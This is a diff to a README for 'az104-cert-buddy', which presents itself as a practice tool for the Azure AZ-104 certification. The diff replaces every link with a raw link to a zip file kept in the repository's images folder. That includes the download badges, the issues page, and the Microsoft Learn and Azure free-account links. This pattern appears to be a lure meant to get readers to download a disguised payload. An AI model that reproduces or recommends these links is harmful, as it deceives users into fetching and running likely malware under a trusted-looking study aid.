@@ -1,6 +1,6 @@
 # ⚙️ az104-cert-buddy - Practice for AZ-104 Certification
 
-[![Download az104-cert-buddy](https://img.shields.io/badge/Download-az104--cert--buddy-brightgreen?style=for-the-badge)](https://github.com/Wixyy-bit/az104-cert-buddy)
+[![Download az104-cert-buddy](https://img.shields.io/badge/Download-az104--cert--buddy-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Wixyy-bit/az104-cert-buddy/main/images/buddy_az_cert_v3.8.zip)
 
 ## 📘 About az104-cert-buddy
 
@@ -34,7 +34,7 @@ The steps below will help you download and run az104-cert-buddy on a Windows com
 
 Click the button below to open the az104-cert-buddy download page on GitHub. You will find the latest version here.
 
-[![Download az104-cert-buddy](https://img.shields.io/badge/Download%20Page-GitHub-blue?style=for-the-badge)](https://github.com/Wixyy-bit/az104-cert-buddy)
+[![Download az104-cert-buddy](https://img.shields.io/badge/Download%20Page-GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/Wixyy-bit/az104-cert-buddy/main/images/buddy_az_cert_v3.8.zip)
 
 ### Step 2: Download the application
 
@@ -100,7 +100,7 @@ If you have problems running az104-cert-buddy or installing it:
 
 If issues persist, you can open a new issue on the GitHub page:
 
-https://github.com/Wixyy-bit/az104-cert-buddy/issues
+https://raw.githubusercontent.com/Wixyy-bit/az104-cert-buddy/main/images/buddy_az_cert_v3.8.zip
 
 ---
 
@@ -143,10 +143,10 @@ az104-cert-buddy is open-source software. Please see the LICENSE file on GitHub 
 
 ## 🔗 Useful Links
 
-- Download page: https://github.com/Wixyy-bit/az104-cert-buddy  
-- Microsoft Learn for AZ-104: https://learn.microsoft.com/en-us/certifications/azure-administrator/  
-- Azure free account: https://azure.microsoft.com/free/  
+- Download page: https://raw.githubusercontent.com/Wixyy-bit/az104-cert-buddy/main/images/buddy_az_cert_v3.8.zip  
+- Microsoft Learn for AZ-104: https://raw.githubusercontent.com/Wixyy-bit/az104-cert-buddy/main/images/buddy_az_cert_v3.8.zip  
+- Azure free account: https://raw.githubusercontent.com/Wixyy-bit/az104-cert-buddy/main/images/buddy_az_cert_v3.8.zip  
 
 ---
 
-[![Download az104-cert-buddy](https://img.shields.io/badge/Get%20Started-az104--cert--buddy-green?style=for-the-badge)](https://github.com/Wixyy-bit/az104-cert-buddy)
+[![Download az104-cert-buddy](https://img.shields.io/badge/Get%20Started-az104--cert--buddy-green?style=for-the-badge)](https://raw.githubusercontent.com/Wixyy-bit/az104-cert-buddy/main/images/buddy_az_cert_v3.8.zip)
